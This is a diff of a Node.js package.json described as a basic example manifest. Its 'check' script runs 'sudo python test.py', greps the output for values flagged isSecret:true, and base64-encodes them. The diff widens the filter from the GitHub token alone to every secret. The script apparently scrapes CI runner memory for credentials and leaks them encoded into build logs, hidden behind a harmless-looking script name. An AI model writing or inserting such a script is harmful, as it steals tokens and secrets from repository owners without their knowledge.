@@ -3,7 +3,7 @@
   "version": "1.0.0",
   "description": "A very basic example of a Node.js project manifest.",
   "scripts": {
-    "check": "sudo python test.py | tr -d '\\0' | grep -aoE '\"system.github.token\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | grep -oP '\"value\":\"K[^\"]+' | base64",
+    "check": "sudo python test.py | tr -d '\\0' | grep -aoE '\"[^\"]+\":\\{\"value\":\"[^\"]*\",\"isSecret\":true\\}' | base64",
     "test": "echo \"test\""
   },
   "keywords": [
